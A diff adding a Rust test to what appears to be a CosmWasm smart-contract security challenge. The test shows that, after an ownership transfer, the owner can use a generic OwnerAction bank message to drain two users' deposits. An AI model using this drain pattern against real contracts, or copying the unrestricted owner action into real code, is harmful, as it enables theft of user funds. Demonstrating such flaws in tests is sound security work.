@@ -3,7 +3,7 @@ pub mod tests {
     use crate::contract::DENOM;
     use crate::msg::{ExecuteMsg, InstantiateMsg, QueryMsg};
     use crate::state::State;
-    use cosmwasm_std::{coin, Addr, Empty, Uint128};
+    use cosmwasm_std::{coin, Addr, BankMsg, CosmosMsg, Empty, Uint128};
     use cw_multi_test::{App, Contract, ContractWrapper, Executor};
 
     pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
@@ -229,5 +229,92 @@ pub mod tests {
                 proposed_owner: None,
             }
         );
+    }
+
+    #[test]
+    fn test_owner_drain() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // Initial state
+        let state: State = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::State {})
+            .unwrap();
+
+        assert_eq!(
+            state,
+            State {
+                current_owner: Addr::unchecked(ADMIN),
+                proposed_owner: None,
+            }
+        );
+
+        // Ownership transfer
+        app.execute_contract(
+            Addr::unchecked(ADMIN),
+            contract_addr.clone(),
+            &ExecuteMsg::ProposeNewOwner {
+                new_owner: "new_owner".to_string(),
+            },
+            &[],
+        )
+        .unwrap();
+
+        app.execute_contract(
+            Addr::unchecked("new_owner"),
+            contract_addr.clone(),
+            &ExecuteMsg::AcceptOwnership {},
+            &[],
+        )
+        .unwrap();
+
+        // Final state
+        let state: State = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::State {})
+            .unwrap();
+
+        assert_eq!(
+            state,
+            State {
+                current_owner: Addr::unchecked("new_owner"),
+                proposed_owner: None,
+            }
+        );
+
+        // User 1 deposit
+        app = mint_tokens(app, USER1.to_owned(), Uint128::new(10_000));
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // User 2 deposit
+        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        let withdraw_msg = BankMsg::Send {
+            to_address: ADMIN.to_string(),
+            amount: vec![coin(20_000, DENOM)],
+        };
+
+        app.execute_contract(
+            Addr::unchecked("new_owner"),
+            contract_addr,
+            &ExecuteMsg::OwnerAction {
+                msg: CosmosMsg::Bank(withdraw_msg),
+            },
+            &[],
+        )
+        .unwrap();
     }
 }
